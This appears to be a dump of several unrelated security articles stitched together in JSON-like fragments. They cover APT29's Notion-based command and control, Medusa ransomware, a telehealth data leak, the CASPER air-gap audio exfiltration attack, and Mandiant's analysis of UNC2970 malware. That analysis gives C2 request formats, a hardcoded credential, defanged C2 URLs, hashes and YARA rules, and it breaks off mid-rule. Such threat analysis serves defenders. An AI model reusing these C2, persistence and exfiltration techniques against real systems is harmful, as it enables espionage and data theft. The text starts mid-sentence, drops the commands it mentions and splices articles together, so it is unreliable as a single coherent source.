The malware also features remote code execution (RCE) capabilities.“Developers of KamiKakaBot employ various evasion techniques to remain undetected while executing malicious actions on infected devices,” EclecticIQ wrote. “For example, they use living-off-the-land binaries (LOLBINs) [...] to run the KamiKakaBot malware on victims’ devices.”They also used legitimate web services as a Command and Control (C2) server, particularly Telegram, to further hide their malicious intentions.To protect systems against Dark Pink and similar threats, EclecticIQ recommends companies use safe DLL search mode, disable mounting ISO images via group policy and disable browser password saving also via group policy, as well as deploy the highest level of protection on firewalls and endpoints."

      "title": "Sophisticated APT29 Campaign Abuses Notion API to Target the European Commission | by Gianluca Tiepolo | Medium",
      "text": " --ListenShareResearch by Gianluca TiepoloAPT29 is a highly sophisticated Advanced Persistent Threat (APT) group that has been attributed to Russia’s Foreign Intelligence Service (SVR). The group has been active since at least 2008 and has been involved in a wide range of espionage and cyber-attack campaigns targeting governments, military organizations, defense contractors, and various industries in the United States, Europe, and Asia.APT29 is also known as NOBELIUM (Microsoft), Cozy Bear (Crowdstrike), The Dukes (Kaspersky), JACKMACKEREL (iDefense), BlueBravo (Recorded Future) and UNC2452 (FireEye).The group is known for its subtle and sophisticated tradecraft in stealing geopolitical intelligence: unlike other Russian state-sponsored groups such as APT28 or Sandworm, APT29 has not been linked to destructive operations and operates with much more discretion.The group has been attributed to a number of high-profile cyberattacks, including:In May 2021, it was revealed that APT29 was responsible for a large-scale cyberattack on multiple U.S. government agencies and private companies, including Microsoft. The group used a compromised email marketing system to send spear-phishing emails to over 3,000 individual accounts, resulting in the installation of a backdoor that allowed the attackers to gain access to the victims’ networks. The group has also been linked to other significant cyberattacks, including the theft of COVID-19 research from U.S.-based pharmaceutical companies.Overall, APT29 is one of the most sophisticated and well-resourced APT groups in the world, and its TTPs are constantly evolving and changing.APT29 is known for its patient and persistent targeting of its victims, often using multi-stage attacks that take weeks or even months to complete. Following is a list of the group’s most notable TTPs:In this particular research, I focused on analyzing APT29’s command-and-control capabilities.This threat group has a history of using trusted and legitimate cloud services (such as social media services and Google Drive) for their cyber attacks in an attempt to blend into normal network traffic and evade detection. Malware distributed by APT29 also contains the ability to exfiltrate data over those same C2 channels. For example:APT29 has also utilized custom encryption methods, such as those found in the group’s SeaDuke malware where a unique fingerprint was generated for the infected host and Base64 encoding and RC4/AES encryption was used to layer data during communications with their C2 server. The group has also employed techniques such as “domain fronting” and TOR obfuscation plugins to create encrypted network tunnels.Using social networks for C2 communications is not an entirely new technique: other Russian groups such as Turla (Venomous Bear) leveraged comments posted to Instagram to obtain the address of its command and control servers.APT29 was spotted using Twitter to control infected machines as early as 2015: in the HAMMERTOSS campaign, the group was able to receive commands and send stolen data through the popular social network, which allowed them to evade detection by security solutions that did not monitor social media traffic.In a more recent campaign dating back to June 2021, APT29 targeted Italy diplomatic organizations with a spear phishing campaign that distributed the EnvyScout backdoor.The backdoor first calls a function to create a custom Slack channel, adding the attacker’s user ID to the newly created channel. The backdoor gets the user name and hostname of the victim host, adds 4 random numbers to form the name of the channel, and sends an HTTP request with an authorization token to the Slack API. After the channel is established, the backdoor enters an infinite loop: it uses the “chat.postMessage” API request to send a beacon message to the newly created channel and it receives a response with a list of additional files and payloads that are downloaded and executed on the target machine.In mid-January 2022, APT29 launched yet another spear phishing campaign targeting a diplomatic entity, which was detected and responded to by Mandiant. During the investigation, Mandiant discovered that the malicious emails were used to distribute the BEATDROP and BOOMMIC downloaders.BEATDROP is a downloader written in C that leverages Trello for Command-and-Control (C2) communication. Trello is a web-based project management application that allows users to organize tasks and projects using customizable boards, lists, and cards.When executed, BEATDROP maps its own copy of ntdll.dll into memory to execute shellcode in its own process. It creates a suspended thread, then enumerates the system for the username, computer name, and IP address to create a victim ID. This victim ID is used by BEATDROP to store and retrieve victim payloads from its C2. Once the victim ID is created, BEATDROP sends an initial request to Trello to determine if the current victim has already been compromised. The shellcode payload is then retrieved from Trello and is targeted for each victim. Once the payload has been retrieved, it is deleted from Trello.Notion API can be abused for C2 communications by embedding the commands into the Notion workspace, which is accessed by the malware as if it were a legitimate user. This misuse of Notion allows the threat actors to evade detection and bypass security controls, as the traffic between the malware and the Notion server is likely to be perceived as legitimate traffic.According to Recorded Future, APT29 utilized a compromised website with a lure text of “Ambassador’s schedule November 2022” to distribute the ZIP file “schedule.zip”, suggesting that the targets of the campaign are related to embassy staff or an ambassador. GraphicalNeutrino, the malware used in the operation, serves as a loader with basic C2 capabilities and employs various anti-analysis techniques to avoid detection, including API unhooking and sandbox evasion.After establishing persistence, the malware decrypts several strings, including a Notion API key and a database identifier, and calculates a unique ID for the victim based on their username and hostname. It then uses Notion’s API for C2 communication to deliver additional payloads to the victim’s machine.For each request to the C2, GraphicalNeutrino parses the JSON-formatted response and searches for a “file” array; if the array is not empty, then the malware will parse out the URL field, download the file and decrypt it using a custom cipher. Once the shellcode is decrypted, it is indirectly spawned in a new thread.The use of diplomatic lures during times of heightened geopolitical tensions, such as the ongoing war in Ukraine, is likely to be effective for Russian APT groups, given the potential impact of information gathered from compromised entities or individuals on Russian foreign policy and strategic decision-making processes. It is perhaps for this reason that APT29 adopted the same tactics — in particular the stealthy C2 communication through Notion — for its next big campaign, this time targeting the European Commission.Beginning mid-February 2023, a spear phishing campaign targeted a number of email addresses related to members of the European Commission. The attack involved the distribution of a malicious .iso image that contained a new sample of the VaporRage downloader. Once executed, the malware was observed exploiting the Notion API to deploy Cobalt Strike beacons.The first phishing email, sent on the 13th February 2023, masqueraded as an administrative notice related to documents available to download from eTrustEx, a web based exchange platform that ensures secure transmission of documents between members of the Commission. The decoy emails are written in English and were delivered to an extremely targeted number of key people that use the eTrustEx platform.In addition, I noticed that in different samples of the email, the senders are probably compromised email accounts belonging to legitimate government organizations. This could lead victims to believe that the emails came from reliable partners, making it more likely for recipients to click on the links.The ISO file is set to auto-download when the website is visited by the victim; this is achieved through the following JavaScript code. The contents of Instructions.iso is stored in the d variable.Once the file has been written to disk, when a user double-clicks on it in Windows 10 or later, the image is mounted and the folder contents is displayed in Windows Explorer. The ISO contains two files — a Windows shortcut file (Instructions.lnk) and a malicious DLL (BugSplatRc64.dll).If the user clicks on the LNK file, the following command runs, unintentionally triggering the execution of the malicious DLL.When executed with the InitiateDs export, VaporRage first runs a few reconnaissance commands and generates a host-id by hex-encoding the DNS domain and username. Then, it creates a copy of itself at:C:\\Users\\%USERNAME%\\AppData\\Local\\DsDiBacks\\BugSplatRc64.dllVaporRage then establishes persistence on the compromised system by creating a registry run key located at: \\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\DsDiBacks.As I anticipated at the start of this post, the VaporRage sample delivered in the execution chain leverages its command-and-control by communicating over HTTPS using Notion APIs. Notion’s database feature is also used to store victim information and stage further payloads for download.Based on my observations, this VaporRage sample periodically executes a POST request to the Notion API to check the availability of a second-stage malware payload, which is then retrieved and executed in memory. In this particular campaign, APT29 used VaporRage to distribute Cobalt Strike beacons to further establish a foothold within the environment.Following is a sample POST request towards api.notion.com (104[.]18.42.99):Overall, the use of cloud services such as Trello and Notion for C2 communications not only provides a threat actor with increased capabilities for evasion of network security controls, but also increases resilience to law enforcement takedowns: social media and cloud services are often hosted on multiple servers and locations, making it more difficult for authorities to take down the entire platform. This means that the threat actor can continue to use the platform for C2 communications even if some servers are taken down. These advantages make it an attractive option for threat groups such as APT29 to conduct their malicious activities.The range of tactics, techniques, and procedures (TTPs) used by APT29 in this campaign supports the conclusion that their objective is to establish numerous means of long-term access to facilitate espionage-related intelligence gathering within the targeted government entities’ victim networks. Nations that have a connection to the Ukraine crisis, specifically those with significant geopolitical, economic, or military ties to Russia or Ukraine, face a heightened risk of being targeted by APT29.This threat group has shown an impressive ability to adapt swiftly during their operations. They use innovative and unique methods to circumvent detection and authentication requirements in their target environments. In their recent operations, the group has demonstrated a deep understanding of operational security, enabling them to move seamlessly between on-premises and cloud resources with minimal use of malware. These factors, combined with their advanced malware development skills, long history of operations, and extended time on targets, indicate that APT29 is a well-funded and exceptionally sophisticated actor and will definitely continue to be a threat during 2023.Following is a list of indicators associated to this campaign.Domains hxxps://literaturaelsalvador[.]com/instructions.htmlhxxps://api[.]notion[.]com/v1/databases/37089abc0926463182bb5343bce252cc/queryIPs108[.]167.180.186104[.]18.42.99Files — SHA25621a0b617431850a9ea2698515c277cbd95de4e59c493d0d8f194f3808eb16354 (Instructions.iso)e957326b2167fa7ccd508cbf531779a28bfce75eb2635ab81826a522979aeb98 (BugSplatRc64.dll)About the Author — Gianluca TiepoloI’m a cybersecurity researcher who specializes in digital forensics and incident response for the telecommunications industry.

      "text": " A ransomware operation known as Medusa has begun to pick up steam in 2023, targeting corporate victims worldwide with million-dollar ransom demands.The Medusa operation started in June 2021 but had relatively low activity, with few victims. However, in 2023 the ransomware gang increased in activity and launched a 'Medusa Blog' used to leak data for victims who refused to pay a ransom.Due to the commonly used name, there has been some confusing reporting about this ransomware family, with many thinking it's the same as MedusaLocker.However, the Medusa and MedusaLocker ransomware operations are entirely different. The MedusaLocker operation launched in 2019 as a Ransomware-as-a-Service, with numerous affiliates, a ransom note commonly named How_to_back_files.html, and a wide variety of file extensions for encrypted files.The MedusaLocker operation uses a Tor website at qd7pcafncosqfqu3ha6fcx4h6sr7tzwagzpcdcnytiw3b6varaeqv5yd.onion for negotiation.However, the Medusa ransomware operation launched around June 2021 and has been using a ransom note named !!!READ_ME_MEDUSA!!!.txt and a static encrypted file extension of .MEDUSA.The Medusa operation also uses a Tor website for ransom negotiations, yet their's is located at medusacegu2ufmc3kx2kkqicrlcxdettsjcenhjena6uannk5f4ffuyd.onion.BleepingComputer has only been able to analyze the Medusa encryptor for Windows, and it is not known if they have one for Linux at this time.The Windows encryptor will accept command-line options that allow the threat actor to configure how files will be encrypted on the device, as shown  below.For example, the -v command line argument will cause the ransomware to display a console, showing status messages as it encrypts a device.In a regular run, without command line arguments, the Medusa ransomware will terminate over 280 Windows services and processes for programs that may prevent files from being encrypted. These include Windows services for mail servers, database servers, backup servers, and security software.Gillespie further confirmed that the encryption method used in Medusa is different than the one used in MedusaLocker.When encrypting files, the ransomware will append the .MEDUSA extension to encrypted file names, as shown below. For example, 1.doc would be encrypted and renamed to 1.doc.MEDUSA.In each folder, the ransomware will create a ransom note named !!!READ_ME_MEDUSA!!!.txt that contains information about what happened to the victim's files.The ransom note will also include extension contact information, including a Tor data leak site, a Tor negotiation site, a Telegram channel, a Tox ID, and the key.medusa.serviceteam@protonmail.com email address.The Tor negotiation site is at http://medusacegu2ufmc3kx2kkqicrlcxdettsjcenhjena6uannk5f4ffuyd.onion.As an extra step to prevent the restoration of files from backups, the Medusa ransomware will run the following command to delete locally stored files associated with backup programs, like Windows Backup. This command will also delete virtual disk hard drives (VHD) used by virtual machines.The Tor negotiation site calls itself \"Secure Chat,\" where each victim has a unique ID that can be used to communicate with the ransomware gang.Like most enterprise-targeting ransomware operations, Medusa has a data leak site named 'Medusa Blog.' This site is used as part of the gang's double-extortion strategy, where they leak data for victims who refuse to pay a ransom.When a victim is added to the data leak, their data is not immediately published. Instead, the threat actors give the victims paid options to extend the countdown before data is released, to delete the data, or to download all of the data. Each of these options has different prices, as shown below.These three options are done to apply extra pressure on the victim to scare them into paying a ransom.Unfortunately, no known weaknesses in the Medusa Ransomware encryption allow victims to recover their files for free.Researchers will continue to analyze the encryptor, and if a weakness is found, we will report it at BleepingComputer."

      "text": " This data of more than 3.1 million patients in the US has apparently been shared with advertisers and social media giants like Facebook, Google, and TikTok. In a notice published on the company’s website, it addressed the case, admitting to having exposed patient data from as far back as October 2019 by the tracking technologies it had been utilizing. The telehealth startup came to light in the wake of the COVID-19 pandemic, after the online-only virtual health services came into culture due to lockdown, disclosing the security lapse in its system at the time. In a filing with the federal government, pertaining to the security lapse, the company revealed that it has shared personal and health-related information of patients who were attempting to seek therapy or other mental health care service via their app. The collected and distributed data includes information like names, phone numbers, email addresses, dates of birth, IP addresses, and other demographic data. In addition to data obtained from Cerebral's online mental health self-assessment, which may also have included the services that the patient chose, assessment responses, and other related health information was also there.Reportedly, Cerebral was using trackers and other data-collecting programmes that the company included in its apps to share patient data with digital giants in real time. In most cases, it has been observed that online users have no idea if they are opting into the tracking options in these apps, and simply accept the app’s terms of use and privacy policies, which they clearly do not read. According to Cerebral, the data could vary from patient to patient based on different factors, like “what actions individuals took on Cerebral’s Platforms, the nature of the services provided by the Subcontractors, the configuration of Tracking Technologies,” and more.\nThe company added that it will notify the affected users, regardless of “how an individual interacted with the Cerebral’s platform.” Moreover, it claims that nothing such as the patient’s social security, credit card credentials, or bank account information has been exposed.\nFollowing the data breach in January, the company says it has “disabled, reconfigured, and/or removed any of the tracking pixels on the platform to prevent future exposures, and has enhanced its information security practices and technology vetting processes.” It added that the company has terminated the tracking code from its apps. However, the tech giants are under no obligation in taking down the exposed data that Cerebral has shared. Taking into account the way Cerebral manages sensitive patient information, it is being protected by the HIPAA health privacy regulation in the United States. The U.S. Department of Health and Human Services, which supervises and enforces HIPAA, has compiled a list of health-related security violations under investigation. Cerebral's data leak is the second-largest compromise of health data in 2023.\n your nameYour Emailyour message"

      "text": " Researchers at the School of Cyber Security at Korea University, Seoul, have presented a new covert channel attack named CASPER can leak data from air-gapped computers to a nearby smartphone at a rate of 20bits/sec.The CASPER attack leverages the internal speakers inside the target computer as the data transmission channel to transmit high-frequency audio that the human ear cannot hear and convey binary or Morse code to a microphone up to 1.5m away.The receiving microphone can be in a smartphone recording sound inside the attacker's pocket or a laptop in the same room.Researchers have previously developed similar attacks leveraging external speakers. However, air-gapped, network-isolated systems used in critical environments, such as government networks, energy infrastructure, and weapon control systems, are unlikely to have external speakers.On the other hand, internal speakers that provide audio feedback, such as boot-up beeps, are still considered necessary, so they're commonly present, making them better candidates.As is the case with almost all secret channel attacks targeting network-isolated computers, a rogue employee or a stealthy intruder with physical access to the target must first infect it with malware.Although this scenario may seem impractical or even far-fetched, there have been multiple instances of such attacks being successfully carried out in the past, with notable examples including the Stuxnet worm, which targeted Iran's uranium enrichment facility at Natanz, the Agent.BTZ malware that infected a U.S. military base, and the Remsec modular backdoor, which secretly collected information from air-gapped government networks for over five years.The malware can autonomously enumerate the target's filesystem, locate files or file types that match a hardcoded list and attempt to exfiltrate them.More realistically, it can perform keylogging, which is more suitable for such a slow data transmission rate.The malware will encode the data to be exfiltrated from the target in binary or Morse code and transmit it through the internal speaker using frequency modulation, achieving an imperceptible ultrasound in a range between 17 kHz and 20 kHz.The researchers experimented with the described model using a Linux-based (Ubuntu 20.04) computer as the target, and a Samsung Galaxy Z Flip 3 as the receiver, running a basic recorder application with a sampling frequency of up to 20 kHz.In the Morse code experiment, the researchers set the length per bit to 100 ms and used 18 kHz for dots and 19 kHz for the dash. The smartphone was located 50cm away and was able to decode the sent word \"covert.\"In the binary data experiment, the length per bit was set to 50 ms, transferring zeros at a frequency of 18 kHz and 1s at 19 kHz. A 50 ms start/end bit was also used at 17 kHz to indicate the beginning of a new message.Based on the conducted tests, the maximum distance of the receiver is 1.5 meters (4.9 ft), using a length per bit of 100 ms.The overall results of the experiment, however, show that the length per bit affects the bit error rate, and a maximum reliable transmitting bit rate of 20 bits/s is achievable when the length per bit is 50 ms.At this data transfer rate, the malware could transmit a typical 8-character length password in about 3 seconds and a 2048-bit RSA key in 100 seconds.Anything above that, like a small 10 KB file, for example, would need over an hour to exfiltrate from the air-gapped system, even if the conditions are ideal and no interruptions occur during the transmission.A solution to the slow data rate would be to vary the frequency band for multiple simultaneous transmissions; however, internal speakers can only produce sound in a single frequency band, so the attack is practically limited.The researchers shared ways to defend against the CASPER attack, with the simplest being to remove the internal speaker from mission-critical computers.If that's impossible, defenders could implement a high-pass filter to keep all generated frequencies within the audible sound spectrum, blocking ultrasound transmissions."

Once UNC2970 contacts a target, they would attempt to shift the conversation to WhatsApp, where they would continue interacting with their target before sending a phishing payload that masqueraded as a job description. In at least one case, UNC2970 continued interacting with a victim even after the phishing payload was executed and detected, asking for screenshots of the detection.The C2 servers utilized by UNC2970 for remote template injection have primarily been compromised WordPress sites, a trend observed in other UNC2970 code families as well as those used by other DPRK groups. At the time of analysis, the remote template was no longer present on the C2, however following this phishing activity, Mandiant identified it beaconing to a C2 associated with PLANKWALK.In addition to functioning as a legitimate TightVNC viewer, LIDSHIFT contained multiple hidden features. The first was that upon execution by the user, the malware would send a beacon back to its hardcoded C2; the only interaction this needed from the user was the launching of the program. This lack of interaction differs from what MSTIC observed in their recent blog post. The initial C2 beacon from LIDSHIFT contains the victim’s initial username and hostname.LIDSHOT sends the following information back to its C2:In multiple investigations, Mandiant has observed UNC2970 deploy PLANKWALK to establish footholds within environments. PLANKWALK is a backdoor written in C++ that communicates over HTTP and utilizes multiple layers of DLL sideloading to execute an encrypted payload. PLANKWALK is initially executed through a launcher that will import and execute a second stage launcher expected to be on disk.Observed First Stage Launcher names:Once loaded and executed, the secondary launcher will attempt to decrypt and execute an encrypted PLANKWALK sample on disk that matches the following pattern:C:\\ProgramData\\Microsoft\\Vault\\cache<three numerical digits>.dbOnce executed, PLANKWALK will decrypt an on-host encrypted configuration file that contains the C2 for the backdoor. The C2 for PLANKWALK has largely been co-opted by legitimate WordPress sites.Following the deployment of PLANKWALK, Mandiant observed UNC2970 leverage a wide variety of additional tooling, including Microsoft InTune to deploy a shellcode downloader.During their operations, Mandiant has observed UNC2970 use a wide range of custom, post-exploitation tooling to achieve their goals. One of UNC2970's go-to tools has been a dropper tracked as TOUCHSHIFT. TOUCHSHIFT allows UNC2970 to employ follow-on tooling that range from keyloggers and screenshot utilities, to full featured backdoors.TOUCHSHIFT is a malicious dropper that masquerades as mscoree.dll or netplwix.dll. TOUCHSHIFT is typically created in the same directory and simultaneously as a legitimate copy of a Windows binary. TOUCHSHIFT leverages DLL Search Order Hijacking to use the legitimate file to load and execute itself. TOUCHSHIFT has been observed containing one to two various payloads which it executes in-memory. Payloads that have been seen include TOUCHSHOT, TOUCHKEY, HOOKSHOT, TOUCHMOVE, and SIDESHOW.To appear legitimate, the file uses over 100 exports that match common system export names. However, the majority all point to the same empty function. The malicious code has been seen located in exports LockClrVersion or UsersRunDllW in different instances.When TOUCHSHIFT contains a second payload, it takes a single character command line option as its first argument to determine which of the two payloads to execute.To unpack its payload(s), TOUCHSHIFT generates a decryption key by XOR encoding its second argument and the first 16 characters of the legitimate executable’s file name.For example, in one instance Mandiant observed the arguments -CortanaUIFilter, XOR encoded with the hardcoded key 009WAYHb90687PXkS, and printfilterpipel, which was XOR encoded with the hardcoded key .sV%58&.lypQ[$= and was loaded by the file printfilterpipelinesvc.exe. In another instance, the argument used was --forkavlauncher and the loading file was C:\\windows\\Branding\\Netplwiz.exe.Once the code is unpacked, it is then loaded into a memory location created by a call to VirtualAlloc and executed from there.Once the payload(s) has/have been executed, the main portion of TOUCHSHIFT will sleep for a period of time allowing the payload(s) to continue executing.TOUCHSHOT will create a file in the C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\ directory, and will name the file ~DM{####}P.dat, where the four numbers are pseudo-randomly generated. Once TOUCHSHOT has generated the file name, it attempts to create a handle to the file. If the return value indicates that the file does not exist, it will then create the file. This check is performed as part of a loop that continues until a new file needs to be created. After each iteration of the loop, TOUCHSHOT will then take a screenshot, which is appended to the staging file.TOUCHKEY creates two files in the C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Templates\\ directory. The file name Normal.dost is used for storing the captured keystrokes, while the file name Normal.docb is used for the clipboard data. The full paths are then passed into their own thread, where the keystrokes or clipboard data will be captured and appended to their respective files.In one of the created threads, TOUCHKEY will open the clipboard and grab the data that is stored within it. In the other thread, TOUCHKEY will set a hook into the keyboard, and record any keys that are pressed.HOOKSHOT takes an encoded argument containing two IP and port pairs, which it will leverage for communicating with its C2.HOOKSHOT will then create a socket using these two IP addresses, and tunnel traffic across them utilizing TLSv1.0.TOUCHMOVE is a loader that decrypts a configuration file and a payload, both of which must be on disk, and then executes the payload. TOUCHMOVE generates an RC6 key to decrypt the two files by querying the system’s BIOS date, version, manufacturer, and product name. Once decrypted, the results are XOR encoded with a hardcoded key. If the generated RC6 key is incorrect, the configuration and payload files will not successfully decrypt, indicating that UNC2970 compiles instances of TOUCHMOVE after having already conducted reconnaissance on the target victim system. Once the RC6 key is successfully generated, a handle is created to the configuration file, and the decryption process is conducted. If the configuration file is successfully decrypted, the payload’s full path is located within it, and the same decryption process then occurs on the payload. Following this, the payload is executed.SIDESHOW is a backdoor written in C/C++ that communicates via HTTP POST requests with its C2 server. The backdoor is multi-threaded, uses RC6 encryption, and supports at least 49 commands, which can be seen in Table 1. Capabilities include arbitrary command execution (WMI capable); payload execution via process injection; service, registry, scheduled task, and firewall manipulation; querying and updating Domain Controller settings; creating password protected ZIP files; and more. SIDESHOW does not explicitly establish persistence; however, based on the multitude of supported commands it may be commanded to establish persistence.SIDESHOW derives a system-specific RC6 key using the same registry values as TOUCHMOVE and uses the generated key to decrypt the same configuration file from disk that TOUCHMOVE decrypted. The decrypted configuration file contains a list of C2 URLs to which SIDESHOW communicates using HTTP POST requests. SIDESHOW iterates this C2 URL list and attempts to authenticate to each C2 URL until it is successful. Once successful, SIDESHOW enters a state of command processing and sends additional HTTP POST requests to retrieve commands. SIDESHOW attempts to use the system's default HTTP User-Agent string during C2 communications; however, if not available it uses the hard-coded HTTP User-Agent string:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Edg/97.0.1072.69When communicating to its C2 server via HTTP POST requests, SIDESHOW forms a URI parameter string consisting of a mix of randomly selected and hard-coded URI parameters.Authentication requests use the following URI parameter string format:1<param_1>=<hex_seed>&<param_2>=pAJ9dk4OVq85jxKWoNfw1AG2C&<param_3>=<16_random_hex_chars>The first URI parameter value comes from SIDESHOW’s configuration and is used to seed the random function.The second URI parameter value, pAJ9dk4OVq85jxKWoNfw1AG2C, is hardcoded and likely an authentication credential.The third URI parameter value, <16_random_hex_chars>, is a session identifier (<session_id>) used for future communications and consists of two subcomponents: The first URI parameter's value, <hex_seed>, is used as a random seed value to derive the first eight hexadecimal characters (<8_random_hex_based_on_seed>), whereas the last eight hexadecimal characters (<8_random_hex_based_on_tickcount>) are derived using the CPU's current tick count as the random seed value. This results in the value <8_random_hex_based_on_seed> being deterministic, while <8_random_hex_based_on_tickcount> is pseudo-random.The following is an example authentication URI parameter string: 1pguid=A59&ssln=pAJ9dk4OVq85jxKWoNfw1AG2C&cup2key=184B280E341AE63FSIDESHOW parses the response and considers it a successful authentication if it contains the string <!DOCTYPE html>.Command requests use the following URI parameter string format (notice that the <param_2> and <param_3> have switched locations in the string).1<param_1>=<5_random_digits>&<param_3>=2<session_id>&<param_2>=<6_random_digits>Example command URI parameter string:1other=37685&session=2184B280E341AE63F&page=593881SIDESHOW parses the command response body and extracts data following the string <!DOCTYPE html>. SIDESHOW then appears to Base64 decode and RC6 decrypt the extracted data.

Upon further analysis of the Microsoft IME endpoint logs, Mandiant identified a unique GUID, f391eded-82d3-4506-8bf4-9213f6f4d586, in the PolicyID field, which is a \"Unique identifier of the Policy in the data warehouse\". The Intune Data Warehouse provides insight and information about an enterprise mobile environment, such as historical Intune data and Intune data refreshed on a daily occurence. The identified GUID also matched the GUID of the PowerShell script file name and the GUID observed in an IME associated registry key.At the time of analysis, the GroupID f391eded-82d3-4506-8bf4-9213f6f4d586, was no longer present in the Intune Endpoint management admin center, and was likely deleted by the threat actors.In order to determine malicious usage of Microsoft Intune, Mandiant performed the following analysis steps:Mandiant tracks the malware being distributed via InTune as CLOUDBURST. CLOUDBURST is a downloader written in C that communicates via HTTP. The malware attempts to make itself look like a legitimate version of mscoree.dll, but contains fake exports, the same way that TOUCHSHIFT uses fake exports. One variant of CLOUDBURST made use of legitimate open-source software that was added as exports, in addition to the fake exports. The actual export with malicious code is CorExitProcess. The CorExitProcess export expects the single argument -embeddingObject.Once the aforementioned command line argument has been verified, CLOUDBURST builds the domain as a stack string, and sends out the two following requests to the C2 server:hxxps://[c2domain]/wp-content/plugins/contact.php?gametype=<random_dword>&type=O8Akm8aV09Nw412KMoWJd hxxps://[c2domain]/wp-content/plugins/contact.php?gametype=tennis&type=k<random_dword>Following the network connections, CLOUDBURST conducts a host survey, in which it will determine the Product Name, Computer Name, and enumerate running processes.Upon completion of the host enumeration, CLOUDBURST then downloads and executes shellcode from the C2 server. At this time, Mandiant was unable to recover and identify the purpose of the shellcode downloaded by CLOUDBURST.Mandiant has observed UNC2970 leverage weak identity controls in Azure AD combined with Microsoft Intune’s endpoint management capabilities to effectively deploy malicious PowerShell scripts onto unsuspecting endpoints.Increasing Azure AD identity protections and limiting access to Microsoft Intune is essential in mitigating the attacker activity observed by Mandiant. Organizations should consider implementing the following hardening controls:Cloud-Only Accounts: Organizations should utilize cloud-only accounts for privileged access within Azure AD (e.g., Global Admins, Intune Administrator) and never assign privileged access to synced accounts from on-premises identity providers such as Active Directory. Additionally, admins should utilize a separate “daily-driver” account for day-to-day activities such as sending email or web-browsing. Dedicated admin accounts should be utilized to carry out administrative functions only.Privileged Identity Management (PIM) Solution: Mandiant recommends that organizations consider utilizing a PIM solution. A PIM solution should include a Just-In-Time (JIT) access capability which will provide access when requested, for a specific duration of time, and should initiate an approval flow, prior to providing an account access to a highly privileged role (e.g., Global Administrator or Intune Administrator).Azure Identity Protection: Azure Identity Protection is a security feature within Azure Active Directory that allows organizations to automate the detection and remediation of identity-based risks. Identity Protection analyzes user account activity as-well as sign-in activity to identify potentially compromised accounts or unauthorized authentication requests. Identity Protection data can be leveraged to enhance Conditional Access Policies by enforcing access controls based on user or sign-in risk. Additionally, Identity Protection risk data should be exported to a Security Information and Event Management (SIEM) solution for further correlation and analysis. Note: Azure Identity Protection requires an Azure AD Premium P2 License.IOCSignaturee97b13b7e91edeceeac876c3869cc4ebPLANKWALKa9e30c16df400c3f24fc4e9d76db78efPLANKWALKf910ffb063abe31e87982bad68fd0d87PLANKWALK30358639af2ecc217bbc26008c5640a7LIDSHIFT41dcd8db4371574453561251701107bcLIDSHOT866f9f205fa1d47af27173b5eb464363TOUCHSHIFT8c597659ede15d97914cb27512a55fc7TOUCHSHIFTa2109276dc704dedf481a4f6c8914c6eTOUCHSHIFT3bf748baecfc24def6c0393bc2354771TOUCHSHOT91b6d6efa5840d6c1f10a72c66e925ceTOUCHKEY300103aff7ab676a41e47ec3d615ba3fHOOKSHOT49425d6dedb5f88bddc053cc8fd5f0f4TOUCHMOVEabd91676a814f4b50ec357ca1584567eSIDESHOW05b6f459be513bf6120e9b2b85f6c844CLOUDBURSThxxp://webinternal.anyplex[.]com/images/query_image.jspPLANKWALK C2hxxp://www.fainstec[.]com/assets/js/jquery/jquery.phpPLANKWALK C2hxxps://ajayjangid[.]in/js/jquery/jquery.phpPLANKWALK C2hxxps://sede.lamarinadevalencia[.]com/tablonEdictal/layout/contentLayout.jspPLANKWALK C2hxxps://leadsblue[.]com/wp-content/wp-utility/index.phpLIDSHOT C2hxxps://toptradenews[.]com/wp-content/themes/themes.phpSIDESHOW C2hxxp://mantis.quick.net[.]pl/library/securimage/index.phpSIDESHOW C2hxxp://www.keewoom.co[.]kr/prod_img/201409/prod.phpSIDESHOW C2hxxp://abba-servicios[.]mx/wordpress/wp-content/themes/config.phpSIDESHOW C2hxxp://www.ruscheltelefonia[.]com.br/public/php/index.phpSIDESHOW C2hxxps://olidhealth[.]com/wp-includes/php-compat/compat.phpCLOUDBURST C2hxxps://doug[.]org/wp-includes/admin.phpCLOUDBURST C2hxxps://crickethighlights[.]today/wp-content/plugins/contact.phpCLOUDBURST C2VIDNameA105-491Command and Control - QUESTDOWN, Exfiltration, Variant #1A105-492Command and Control - QUESTDOWN, Exfiltration, Variant #2A105-493Command and Control - QUESTDOWN, Next Stage Download Attempt, Variant #1A105-494Command and Control - QUESTDOWN, Status, Variant #1A105-507Phishing Email - Malicious Attachment, PLANKWALK Downloader, Variant #1A105-508Phishing Email - Malicious Attachment, QUESTDOWN Dropper, Variant #1A105-514Protected Theater - QUESTDOWN, Execution, Variant #1S100-218Malicious Activity Scenario - Campaign 22-046, QUESTDOWN Infectionrule M_Hunt_APT_PLANKWALK_Code_String {   meta:    author = \"Mandiant\"    description = \"Detects a format string containing code and token found in PLANKWALK\"  strings:     $hex = { 63 6F 64 65 [1-6] 3D 25 64 26 [1-6] 75 73 65 72 [1-6] 3D 25 73 26 [1-6] 74 6F 6B 65   }  condition:     (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and $hex}rule M_APT_Loader_Win_LIDSHIFT_1 {   meta:      author = \"Mandiant\"      description = \"Detects LIDSHIFT implant\"    strings:      $anchor1 = \"%s:%s:%s\" ascii      $encloop = { 83 ?? 3F 72 ??
